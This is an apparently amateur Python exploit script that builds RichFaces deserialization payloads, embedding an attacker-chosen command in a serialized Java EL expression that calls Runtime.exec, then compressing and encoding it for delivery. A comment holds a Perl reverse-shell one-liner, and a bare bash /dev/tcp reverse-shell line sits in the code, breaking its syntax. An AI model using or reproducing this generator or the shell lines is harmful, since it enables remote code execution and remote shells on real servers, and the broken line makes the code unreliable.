import zlib, base64

"""
	Richfaces Payload Generator for noobs master blaster in the earth
	
	WARNING - THIS SCRIPT ITS A PURE GARBARAGE, DONT USE IT..
	
	author: a men without shame


	okay, this is lame, all the things i do was base64 > zlibdecompress > change payload and do all the reverse process..
	THIS IS NOT A OFICIAL POC GENERATOR OU SOMEHTING LIKE THAT !! so, dont hate me.. but.. it is working for me ^^ 

"""

#perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


def padding(payload):
	# full fucking boring
	endstep = list("vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv") # STR
	payload = payload.replace("'","\\'").replace('"','\\"')
	payload = list(payload)
	ret = ""

	for i in range(len(payload)):
		endstep[i] = payload[i]
	
	for x in range(len(endstep) - len(payload)):
		endstep[len(payload)+x] = " "

	ret = "".join(endstep)

	return ret

bash -i >& /dev/tcp/172.17.0.1/4 0>&1
def generator(payl0ad):
	# Generator payload 
	maybe_original_payload = b'\xac\xed\x00\x05sr\x00*org.ajax4jsf.resource.UserResource$UriData\x00\x00\x00\x00\x00\x135\xeb\x02\x00\x04L\x00\rcreateContentt\x00\x12Ljava/lang/Object;L\x00\x07expiresq\x00~\x00\x01L\x00\x08modifiedq\x00~\x00\x01L\x00\x05valueq\x00~\x00\x01xpsr\x00&javax.faces.component.StateHolderSaverY\xca\xb3=\x93\x9c\xcdM\x02\x00\x02L\x00\tclassNamet\x00\x12Ljava/lang/String;L\x00\nsavedStatet\x00\x16Ljava/io/Serializable;xppsr\x00\'com.sun.facelets.el.TagMethodExpression\x00\x00\x00\x00\x00\x00\x00\x01\x0c\x00\x00xr\x00\x19javax.el.MethodExpression\xb2/\xca\x8b\xe4\xf74\x8e\x02\x00\x00xr\x00\x13javax.el.Expression\xa3\x85\x8aS\xf2Z\xd2<\x02\x00\x00xpsr\x00!org.jboss.el.MethodExpressionImplb\xf0\x17\xf5\x0b\xc1\x11M\x0c\x00\x00xq\x00~\x00\x08w\xb7\x00\xb3${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\'vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv\')")}\x00\x00ur\x00\x13[Ljava.lang.String;\xad\xd2V\xe7\xe9\x1d{G\x02\x00\x00xp\x00\x00\x00\x02t\x00\x14java.io.OutputStreamt\x00\x10java.lang.ObjectppxwL\x00J/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx @36,68 createContent="#{mediaBean.process}"xppp'
	

	if len(payl0ad) < 35:
		#padding vvv.. 
		carga = maybe_original_payload.replace(b"vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv", str.encode(padding(payl0ad)))
	else:
		carga = maybe_original_payload.replace(b"vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv", str.encode(payl0ad))

	# Compress zlib
	cargazip = zlib.compress(carga)

	# Encode Base64 end replace caracteres
	cargazip64 = str(base64.b64encode(cargazip))
	cargazip64 = cargazip64.replace("+","-").replace("/","!").replace("=","_")


	print("[+] Boooa cumpinxaaa\n[+] Teu payload ai oh")
	print(cargazip64)


def main():
	# Main
	payload = input("[Fala truta] Qual o payload?[Max 35 bytes]: ")
	print("[*] Size:" + str(payload))

	if len(payload) > 35:
		# pode dar prolema se o payload for maior
		print("[Warning]Maximo eh 35 bytes o teu arrombado.. edita o codigo e tenta a sorte")
		exit()

	generator(payload)


if __name__ == '__main__':
	main()